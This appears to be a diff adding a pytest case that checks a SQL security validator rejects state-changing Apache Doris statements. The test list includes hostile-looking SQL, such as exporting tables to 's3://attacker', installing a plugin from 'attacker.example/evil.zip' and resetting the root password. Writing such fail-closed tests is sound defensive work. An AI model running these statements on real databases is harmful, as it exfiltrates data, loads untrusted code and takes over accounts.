@@ -156,6 +156,47 @@ class TestSQLSecurityValidator:
             assert result.blocked_operations is not None
             assert len(result.blocked_operations) > 0
 
+    @pytest.mark.parametrize(
+        "sql",
+        [
+            "SELECT * FROM orders INTO OUTFILE '/tmp/orders'",
+            (
+                "SELECT * FROM orders INTO OUTFILE 's3://attacker/orders' "
+                "PROPERTIES('s3.access_key'='key','s3.secret_key'='secret')"
+            ),
+            "EXPORT TABLE orders TO 's3://attacker/orders'",
+            'ADMIN SET FRONTEND CONFIG ("plugin_enable"="true")',
+            "ADMIN SET REPLICA STATUS PROPERTIES('tablet_id'='1','backend_id'='2','status'='ok')",
+            "ADMIN CLEAN TRASH",
+            "ADMIN REPAIR TABLE orders",
+            "SET GLOBAL exec_mem_limit = 137438953472",
+            "SET PASSWORD FOR 'root' = PASSWORD('pwned')",
+            'INSTALL PLUGIN FROM "http://attacker.example/evil.zip"',
+            "UNINSTALL PLUGIN malicious_plugin",
+            "BACKUP SNAPSHOT analytics.snapshot TO repository",
+            "RESTORE SNAPSHOT analytics.snapshot FROM repository",
+            "RECOVER TABLE orders",
+            "CANCEL LOAD FROM analytics WHERE LABEL = 'job'",
+            "PAUSE ROUTINE LOAD FOR analytics.job",
+            "RESUME ROUTINE LOAD FOR analytics.job",
+            "STOP ROUTINE LOAD FOR analytics.job",
+            "LOAD LABEL analytics.job (DATA INFILE('s3://attacker/data') INTO TABLE orders)",
+            "REFRESH CATALOG external_catalog",
+        ],
+    )
+    @pytest.mark.asyncio
+    async def test_doris_state_changes_fail_closed(
+        self,
+        sql_validator,
+        analyst_context,
+        sql,
+    ):
+        """Unknown Doris syntax must never inherit read-only status."""
+        result = await sql_validator.validate(sql, analyst_context)
+
+        assert result.is_valid is False
+        assert result.risk_level == "high"
+
     @pytest.mark.asyncio
     async def test_table_access_validation(self, sql_validator, analyst_context):
         """Test table access validation"""
